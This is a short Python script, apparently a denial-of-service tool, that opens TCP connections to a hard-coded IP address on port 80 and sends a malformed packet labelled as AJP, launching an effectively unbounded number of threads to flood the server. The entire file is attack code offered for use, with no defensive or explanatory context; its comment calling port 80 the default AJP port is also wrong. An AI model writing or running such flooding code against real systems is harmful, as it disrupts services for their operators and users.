import socket
import threading
import time

TARGET_IP = "103.38.191.86"  # Change to the target server IP
TARGET_PORT = 80  # Default AJP port

# Craft a malformed AJP message (not a valid AJP13 header)
MALFORMED_PACKET = b"\x12\x34\x56\x78\x9a\xbc\xde\xf0"

def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(MALFORMED_PACKET)
            s.close()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)

# Launch multiple threads to simulate high load
for _ in range(1000000000000000000000000000):  # Adjust thread count to increase/decrease intensity
    thread = threading.Thread(target=flood)
    thread.start()
